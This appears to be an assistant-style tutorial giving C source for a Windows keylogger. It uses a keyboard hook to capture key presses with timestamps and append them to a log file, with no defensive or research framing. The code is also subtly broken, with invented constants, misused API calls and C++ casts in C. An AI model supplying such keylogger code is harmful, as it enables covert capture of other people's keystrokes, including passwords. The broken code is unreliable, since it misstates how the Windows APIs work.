To create a keystroke-logging program on a Windows computer, you can use the Windows API's keyboard hook. Here's a step-by-step guide to implementing this:

### Step-by-Step Explanation:

1. **Include Necessary Headers and Libraries:**
   - Use the Windows header files for keyboard functions.
   ```c
   #include <Windows.h>
   #include <WinUser.h>
   #include <stdio.h>
   #include <time.h>
   ```

2. **Define Constants and Variables:**
   - Define the file path for logging keystrokes.
   ```c
   #define LOG_FILE "keystroke.log"
   ```

3. **Define the Callback Function:**
   - The callback function will handle key presses and releases.
   ```c
   void CALLBACK KeyhookProc(int nCode, int wParam, int lParam) {
       if ((nCode == WH_KEYBOARD_KEYDOWN || nCode == WH_KEYBOARD_KEYUP)) {
           int key = wParam;
           int state = (lParam >> 29) & 1;
           if (state != 0) {
               // Record the keystroke
               time_t now;
               time(&now);
               // Convert the key to a character
               char keyChar = static_cast<char>(ToUnicode(key, 1, &state));
               // Append to the log file
               fprintf(LOG_FILE, "[%s] %c\n", ctime(&now), keyChar);
           }
       }
   }
   ```

4. **Main Function:**
   - Install the keyboard hook and initialize logging.
   ```c
   int main() {
       HHOOK hhook = 0;
       DWORD lastError = 0;

       // Install the keyboard hook
       hhook = SetWindowsHook(WH_KEYBOARD_LL, KeyhookProc);
       if (hhook == 0) {
           printf("Failed to install keyboard hook.\n");
           return 1;
       }

       // Open the log file
       FILE *file = fopen(LOG_FILE, "a");
       if (!file) {
           printf("Failed to create log file.\n");
           return 1;
       }

       // Process messages
       MSG msg;
       while (GetMessage(&msg, hhook)) {
           if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
               // Translate and dispatch the message
               TranslateMessage(&msg);
               DispatchMessage(&msg);
           }
       }

       // Remove the hook and close the file
       UnhookWindowsHook(hhook);
       fclose(file);
       return 0;
   }
   ```

